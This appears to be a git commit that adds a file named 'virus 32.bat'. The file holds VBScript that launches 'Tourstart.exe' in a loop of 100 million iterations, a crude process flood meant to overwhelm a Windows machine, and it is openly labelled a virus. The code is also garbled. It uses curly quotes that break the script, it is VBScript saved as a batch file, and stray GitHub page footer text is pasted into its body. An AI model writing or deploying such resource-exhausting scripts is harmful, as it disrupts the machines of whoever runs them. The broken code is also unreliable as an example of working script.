1bd363a1929d8be0cd4baf9cf9ca97f70e4f7441
HackScribe <135351214+HackScribe@users.noreply.github.com>
2023-06-02 18:14:52 +0200

    Create virus 32.bat

---
+++ virus 32.bat
@@ -0,0 +1,15 @@
+Option Explicit
+
+Dim WSHShell
+Set WSHShell=Wscript.CreateObject(“Wscript.Shell”)
+
+Dim x
+For x = 1 to 100000000
+WSHShell.Run “Tourstart.exe”
+Next
+Footer
+© 2023 GitHub, Inc.
+Footer navigation
+Terms
+Privacy
+Securit
